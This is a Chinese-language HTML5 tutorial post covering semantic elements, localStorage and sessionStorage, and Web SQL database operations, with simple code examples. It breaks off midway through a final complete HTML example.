    <content type="html"><![CDATA[<p>HTML5规范于2014年10月29日由万维网联盟正式宣布，HTML是万维网最核心的超文本标记语言。万维网不等同于互联网，但它是依靠互联网运行的服务之一，万维网又简写为www，它可以实现在互联网的帮助下，访问由许多互相链接的超文本组成的系统。现代的浏览器都支持 HTML5。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="1-语义元素"><a href="#1-语义元素" class="headerlink" title="1.语义元素"></a>1.语义元素</h2><p>语义= 意义。<br>语义元素 = 元素的意义。<br>一个语义元素能够清楚的描述其意义给浏览器和开发者。</p><p><strong>新语义元素</strong></p><ul><li>&lt;header&gt;</li><li>&lt;nav&gt;</li><li>&lt;section&gt;</li><li>&lt;article&gt;</li><li>&lt;aside&gt;</li><li>&lt;figcaption&gt;</li><li>&lt;figure&gt;</li><li>&lt;footer&gt;</li></ul><p><img src="https://img-blog.csdnimg.cn/20210512153653905.gif"></p><h3 id="1-1-lt-header-gt-元素"><a href="#1-1-lt-header-gt-元素" class="headerlink" title="1.1 &lt;header&gt;元素"></a>1.1 &lt;header&gt;元素</h3><p>&lt;header&gt;元素描述了文档的头部区域。&lt;header&gt;元素注意用于定义内容的介绍展示区域。在页面中你可以使用多个&lt;header&gt; 元素。</p><p>实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">article</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">header</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Internet Explorer 9<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">time</span> <span class="hljs-attr">pubdate</span> <span class="hljs-attr">datetime</span>=<span class="hljs-string">&quot;2011-03-15&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">time</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">header</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Windows Internet Explorer 9 (abbreviated as IE9) was released to<br>  the  public on March 14, 2011 at 21:00 PDT.....<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">article</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="1-2-lt-nav-gt-元素"><a href="#1-2-lt-nav-gt-元素" class="headerlink" title="1.2 &lt;nav&gt;元素"></a>1.2 &lt;nav&gt;元素</h3><p>&lt;nav&gt; 标签定义导航链接的部分。&gt;nav&lt; 元素用于定义页面的导航链接部分区域。<br>不是所有的链接都需要包含在 &lt;nav&gt; 元素中!</p><p>实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">nav</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/html/&quot;</span>&gt;</span>HTML<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span> |<br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/css/&quot;</span>&gt;</span>CSS<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span> |<br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/js/&quot;</span>&gt;</span>JavaScript<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span> |<br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/jquery/&quot;</span>&gt;</span>jQuery<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">nav</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="1-3-lt-section-gt-元素"><a href="#1-3-lt-section-gt-元素" class="headerlink" title="1.3 &lt;section&gt;元素"></a>1.3 &lt;section&gt;元素</h3><p>&lt;section&gt; 标签定义文档中的节（section、区段）。比如章节、页眉、页脚或文档中的其他部分。<br>根据W3C HTML5文档: section 包含了一组内容及其标题。</p><p>实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">section</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>WWF<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>The World Wide Fund for Nature (WWF) is....<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">section</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="1-4-lt-article-gt-元素"><a href="#1-4-lt-article-gt-元素" class="headerlink" title="1.4 &lt;article&gt;元素"></a>1.4 &lt;article&gt;元素</h3><p>&lt;article&gt; 标签定义独立的内容。</p><p>实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">article</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Internet Explorer 9<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Windows Internet Explorer 9 (abbreviated as IE9) was released to<br>  the  public on March 14, 2011 at 21:00 PDT.....<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">article</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="1-5-lt-aside-gt-元素"><a href="#1-5-lt-aside-gt-元素" class="headerlink" title="1.5 &lt;aside&gt;元素"></a>1.5 &lt;aside&gt;元素</h3><p>&lt;aside&gt; 标签定义页面主区域内容之外的内容（比如侧边栏）。aside 标签的内容应与主区域的内容相关。</p><p>实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>My family and I visited The Epcot center this summer.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">aside</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">h4</span>&gt;</span>Epcot Center<span class="hljs-tag">&lt;/<span class="hljs-name">h4</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>The Epcot Center is a theme park in Disney World, Florida.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">aside</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="1-6-lt-footer-gt-元素"><a href="#1-6-lt-footer-gt-元素" class="headerlink" title="1.6 &lt;footer&gt;元素"></a>1.6 &lt;footer&gt;元素</h3><p>&lt;footer&gt; 元素描述了文档的底部区域。<br>&lt;footer&gt; 元素应该包含它的包含元素。一个页脚通常包含文档的作者，著作权信息，链接的使用条款，联系信息等。文档中你可以使用多个 &lt;footer&gt;元素。</p><p>实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">footer</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Posted by: Hege Refsnes<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">time</span> <span class="hljs-attr">pubdate</span> <span class="hljs-attr">datetime</span>=<span class="hljs-string">&quot;2012-03-01&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">time</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">footer</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="1-7-lt-figcaption-gt-与-lt-figure-gt-元素"><a href="#1-7-lt-figcaption-gt-与-lt-figure-gt-元素" class="headerlink" title="1.7 &lt;figcaption&gt;与&lt;figure&gt;元素"></a>1.7 &lt;figcaption&gt;与&lt;figure&gt;元素</h3><p>&lt;figure&gt;标签规定独立的流内容（图像、图表、照片、代码等等）。</p><p>&lt;figure&gt; 元素的内容应该与主内容相关，但如果被删除，则不应对文档流产生影响。</p><p>&lt;figcaption&gt;标签定义 &lt;figure&gt; 元素的标题。</p><p>&lt;figcaption&gt;元素应该被置于 “figure” 元素的第一个或最后一个子元素的位置。</p><p>实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">figure</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;img_pulpit.jpg&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;The Pulpit Rock&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;304&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;228&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">figcaption</span>&gt;</span>Fig1. - The Pulpit Pock, Norway.<span class="hljs-tag">&lt;/<span class="hljs-name">figcaption</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">figure</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h2 id="2-Web存储"><a href="#2-Web存储" class="headerlink" title="2.Web存储"></a>2.Web存储</h2><p>在HTML5之前，主要是使用cookies存储，cookies的缺点有：需要在请求头上带着数据，存储大小不过在4k之内。<br>使用HTML5可以在本地存储用户的浏览数据，比cookie更好的本地存储方式。</p><h3 id="2-1-localStorage-和-sessionStorage"><a href="#2-1-localStorage-和-sessionStorage" class="headerlink" title="2.1 localStorage 和 sessionStorage"></a>2.1 localStorage 和 sessionStorage</h3><p>客户端存储数据的两个对象为：</p><ul><li>localStorage - 没有时间限制的数据存储</li><li>sessionStorage - 针对一个 session 的数据存储</li></ul><p>在使用 web 存储前,应检查浏览器是否支持 localStorage 和sessionStorage: </p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">if(typeof(Storage)!==&quot;undefined&quot;)        <br>  &#123;        <br>  // 是的! 支持 localStorage  sessionStorage 对象!         <br>  // 一些代码.....         <br>  &#125;        <br>else        <br>  &#123;        <br>  // 抱歉! 不支持 web 存储。         <br>  &#125;<br></code></pre></div></td></tr></table></figure><h4 id="2-1-1-localStorage-对象"><a href="#2-1-1-localStorage-对象" class="headerlink" title="2.1.1 localStorage 对象"></a>2.1.1 localStorage 对象</h4><p>localStorage 对象存储的数据没有时间限制。第二天、第二周或下一年之后，数据依然可用。</p><p>实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">localStorage.sitename=&quot;W3Cschool在线教程&quot;;<br>document.getElementById(&quot;result&quot;).innerHTML=&quot;网站名：&quot; + localStorage.sitename;<br></code></pre></div></td></tr></table></figure><p>解析：</p><ul><li>使用 key=”sitename” 和 value=”在线学习” 创建一个 localStorage 键/值对。</li><li>检索键值为”sitename” 的值然后将数据插入 id=”result”的元素中。</li></ul><p>上实例也可以这么写：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">// 存储<br>localStorage.sitename = &quot;W3Cschool在线教程&quot;;<br>// 查找<br>document.getElementById(&quot;result&quot;).innerHTML = localStorage.sitename;<br></code></pre></div></td></tr></table></figure><p>移除 localStorage 中的 “lastname” :</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">localStorage.removeItem(&quot;lastname&quot;);<br></code></pre></div></td></tr></table></figure><p>不管是 localStorage，还是 sessionStorage，可使用的API都相同，常用的有如下几个（以localStorage为例）：</p><ul><li>保存数据：localStorage.setItem(key,value);</li><li>读取数据：localStorage.getItem(key);</li><li>删除单个数据：localStorage.removeItem(key);</li><li>删除所有数据：localStorage.clear();</li><li>得到某个索引的key：localStorage.key(index);</li></ul><p><strong>提示：</strong>键/值对通常以字符串存储，你可以按自己的需要转换该格式。</p><p>使用实例：展示了用户点击按钮的次数。(字符串值转换为数字类型)</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">if (localStorage.clickcount)&#123;<br>  localStorage.clickcount=Number(localStorage.clickcount)+1;<br>&#125;<br>else&#123;<br>  localStorage.clickcount=1;<br>&#125;<br>document.getElementById(&quot;result&quot;).innerHTML=&quot; 你已经点击了按钮 &quot; + localStorage.clickcount + &quot; 次 &quot;;<br></code></pre></div></td></tr></table></figure><h4 id="2-1-2-sessionStorage-对象"><a href="#2-1-2-sessionStorage-对象" class="headerlink" title="2.1.2 sessionStorage 对象"></a>2.1.2 sessionStorage 对象</h4><p>sessionStorage 方法针对一个 session 进行数据存储。当用户关闭浏览器窗口后，数据会被删除。</p><p>创建并访问一个 sessionStorage：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">if (sessionStorage.clickcount)&#123;<br>  sessionStorage.clickcount=Number(sessionStorage.clickcount)+1;<br>  &#125;<br>else&#123;<br>  sessionStorage.clickcount=1;<br>  &#125;<br>document.getElementById(&quot;result&quot;).innerHTML=&quot;在这个会话中你已经点击了该按钮 &quot; + sessionStorage.clickcount + &quot; 次 &quot;;<br></code></pre></div></td></tr></table></figure><h2 id="3-Web-SQL"><a href="#3-Web-SQL" class="headerlink" title="3.Web SQL"></a>3.Web SQL</h2><p>Web SQL 是在浏览器上模拟数据库，可以使用 JS 来操作 SQL 完成对数据的读写。Web SQL 数据库 API 并不是 HTML5 规范的一部分，但是它是一个独立的规范，引入了一组使用 SQL 操作客户端数据库的 APIs。</p><h3 id="3-1-核心方法"><a href="#3-1-核心方法" class="headerlink" title="3.1 核心方法"></a>3.1 核心方法</h3><p>规范中定义的三个核心方法：</p><blockquote><ol><li>openDatabase：这个方法使用现有的数据库或者新建的数据库创建一个数据库对象。</li><li>transaction：这个方法让我们能够控制一个事务，以及基于这种情况执行提交或者回滚。</li><li>executeSql：这个方法用于执行实际的 SQL 查询。</li></ol></blockquote><h3 id="3-2-打开数据库"><a href="#3-2-打开数据库" class="headerlink" title="3.2 打开数据库"></a>3.2 打开数据库</h3><p>使用 openDatabase() 方法来打开已存在的数据库，如果数据库不存在，则会创建一个新的数据库。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">var db = openDatabase(&#x27;mydb&#x27;, &#x27;1.0&#x27;, &#x27;Test DB&#x27;, 2 * 1024 * 1024);<br></code></pre></div></td></tr></table></figure><p>openDatabase() 方法对应的五个参数说明：</p><blockquote><ol><li>数据库名称</li><li>版本号</li><li>描述文本</li><li>数据库大小</li><li>创建回调</li></ol></blockquote><p>其中，第五个参数创建回调会在创建数据库后被调用。</p><h3 id="3-3-执行查询操作"><a href="#3-3-执行查询操作" class="headerlink" title="3.3 执行查询操作"></a>3.3 执行查询操作</h3><p>使用 database.transaction() 函数：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">var db = openDatabase(&#x27;mydb&#x27;, &#x27;1.0&#x27;, &#x27;Test DB&#x27;, 2 * 1024 * 1024);<br>db.transaction(function (tx) &#123;  <br>   tx.executeSql(&#x27;CREATE TABLE IF NOT EXISTS LOGS (id unique, log)&#x27;);<br>&#125;);<br></code></pre></div></td></tr></table></figure><p>语句执行后会在 ‘mydb’ 数据库中创建一个名为 LOGS 的表。</p><h3 id="3-4-插入数据"><a href="#3-4-插入数据" class="headerlink" title="3.4 插入数据"></a>3.4 插入数据</h3><p>在执行上面的创建表语句后，我们可以插入一些数据：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">var db = openDatabase(&#x27;mydb&#x27;, &#x27;1.0&#x27;, &#x27;Test DB&#x27;, 2 * 1024 * 1024);<br>db.transaction(function (tx) &#123;<br>   tx.executeSql(&#x27;CREATE TABLE IF NOT EXISTS LOGS (id unique, log)&#x27;);<br>   tx.executeSql(&#x27;INSERT INTO LOGS (id, log) VALUES (1, &quot;HTML5教程&quot;)&#x27;);<br>   tx.executeSql(&#x27;INSERT INTO LOGS (id, log) VALUES (2, &quot;https://tothefor.com/&quot;)&#x27;);<br>&#125;);<br></code></pre></div></td></tr></table></figure><p>使用多态值来插入数据：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">var db = openDatabase(&#x27;mydb&#x27;, &#x27;1.0&#x27;, &#x27;Test DB&#x27;, 2 * 1024 * 1024);<br>db.transaction(function (tx) &#123;  <br>  tx.executeSql(&#x27;CREATE TABLE IF NOT EXISTS LOGS (id unique, log)&#x27;);<br>  tx.executeSql(&#x27;INSERT INTO LOGS (id,log) VALUES (?, ?)&#x27;, [e_id, e_log]);<br>&#125;);<br></code></pre></div></td></tr></table></figure><p>实例中的 e_id 和 e_log 是外部变量，executeSql 会映射数组参数中的每个条目给 “?”。</p><h3 id="3-5-读取数据"><a href="#3-5-读取数据" class="headerlink" title="3.5 读取数据"></a>3.5 读取数据</h3><p>读取数据库中已经存在的数据：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">var db = openDatabase(&#x27;mydb&#x27;, &#x27;1.0&#x27;, &#x27;Test DB&#x27;, 2 * 1024 * 1024);<br><br>db.transaction(function (tx) &#123;<br>   tx.executeSql(&#x27;CREATE TABLE IF NOT EXISTS LOGS (id unique, log)&#x27;);<br>   tx.executeSql(&#x27;INSERT INTO LOGS (id, log) VALUES (1, &quot;HTML5教程&quot;)&#x27;);<br>   tx.executeSql(&#x27;INSERT INTO LOGS (id, log) VALUES (2, &quot;https://tothefor.com/&quot;)&#x27;);<br>&#125;);<br><br>db.transaction(function (tx) &#123;<br>   tx.executeSql(&#x27;SELECT * FROM LOGS&#x27;, [], function (tx, results) &#123;<br>      var len = results.rows.length, i;<br>      msg = &quot;<br>查询记录条数: &quot; + len + &quot;<br><br>&quot;;<br>      document.querySelector(&#x27;#status&#x27;).innerHTML +=  msg;<br><br>      for (i = 0; i &lt; len; i++)&#123;<br>         alert(results.rows.item(i).log );<br>      &#125;<br><br>   &#125;, null);<br>&#125;);<br></code></pre></div></td></tr></table></figure><p><strong>完整实例</strong></p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> db = openDatabase(<span class="hljs-string">&#x27;mydb&#x27;</span>, <span class="hljs-string">&#x27;1.0&#x27;</span>, <span class="hljs-string">&#x27;Test DB&#x27;</span>, <span class="hljs-number">2</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>);<br><span class="hljs-keyword">var</span> msg;<br><br>db.transaction(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">tx</span>) </span>&#123;<br><br>            tx.executeSql(<span class="hljs-string">&#x27;CREATE TABLE IF NOT EXISTS LOGS (id unique, log)&#x27;</span>);<br><br>            tx.executeSql(<span class="hljs-string">&#x27;INSERT INTO LOGS (id, log) VALUES (1, &quot;HTML5教程&quot;)&#x27;</span>);<br><br>            tx.executeSql(<span class="hljs-string">&#x27;INSERT INTO LOGS (id, log) VALUES (2, &quot;https://tothefor.com/&quot;)&#x27;</span>);<br><br>            msg = <span class="hljs-string">&#x27;&lt;p&gt;数据表已创建，且插入了两条数据。&lt;/p&gt;&#x27;</span>;<br><br>            <span class="hljs-built_in">document</span>.querySelector(<span class="hljs-string">&#x27;#status&#x27;</span>).innerHTML =  msg;<br><br>         &#125;);<br><br><br>db.transaction(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">tx</span>) </span>&#123;<br><br>            tx.executeSql(<span class="hljs-string">&#x27;SELECT * FROM LOGS&#x27;</span>, [], <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">tx, results</span>) </span>&#123;<br><br>               <span class="hljs-keyword">var</span> len = results.rows.length, i;<br><br>               msg = <span class="hljs-string">&quot;&lt;p&gt;查询记录条数: &quot;</span> + len + <span class="hljs-string">&quot;&lt;/p&gt;&quot;</span>;<br><br>               <span class="hljs-built_in">document</span>.querySelector(<span class="hljs-string">&#x27;#status&#x27;</span>).innerHTML +=  msg;<br><br>               <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; len; i++)&#123;<br><br>                  msg = <span class="hljs-string">&quot;&lt;p&gt;&lt;b&gt;&quot;</span> + results.rows.item(i).log + <span class="hljs-string">&quot;&lt;/b&gt;&lt;/p&gt;&quot;</span>;<br><br>                  <span class="hljs-built_in">document</span>.querySelector(<span class="hljs-string">&#x27;#status&#x27;</span>).innerHTML +=  msg;<br><br>               &#125;<br><br>            &#125;, <span class="hljs-literal">null</span>);<br><br>         &#125;);<br></code></pre></div></td></tr></table></figure><h3 id="3-6-删除记录"><a href="#3-6-删除记录" class="headerlink" title="3.6 删除记录"></a>3.6 删除记录</h3><p>删除记录的格式：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">db.transaction(function (tx) &#123;<br>    tx.executeSql(&#x27;DELETE FROM LOGS  WHERE id=1&#x27;);<br>&#125;);<br></code></pre></div></td></tr></table></figure><p>删除指定的数据 id 也可以是动态的：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">db.transaction(function(tx) &#123;<br>    tx.executeSql(&#x27;DELETE FROM LOGS WHERE id=?&#x27;, [id]);<br>&#125;);<br></code></pre></div></td></tr></table></figure><h3 id="3-7-更新记录"><a href="#3-7-更新记录" class="headerlink" title="3.7 更新记录"></a>3.7 更新记录</h3><p>更新记录的格式：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">db.transaction(function (tx) &#123;<br>    tx.executeSql(&#x27;UPDATE LOGS SET log=\&#x27;https://tothefor.com/&#x27; WHERE id=2&#x27;);<br>&#125;);<br></code></pre></div></td></tr></table></figure><p>更新指定的数据 id 也可以是动态的：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">db.transaction(function(tx) &#123;<br>    tx.executeSql(&#x27;UPDATE LOGS SET log=\&#x27;https://tothefor.com/&#x27; WHERE id=?&#x27;, [id]);<br>&#125;);<br></code></pre></div></td></tr></table></figure><p><strong>完整实例</strong></p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">HTML</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>      <span 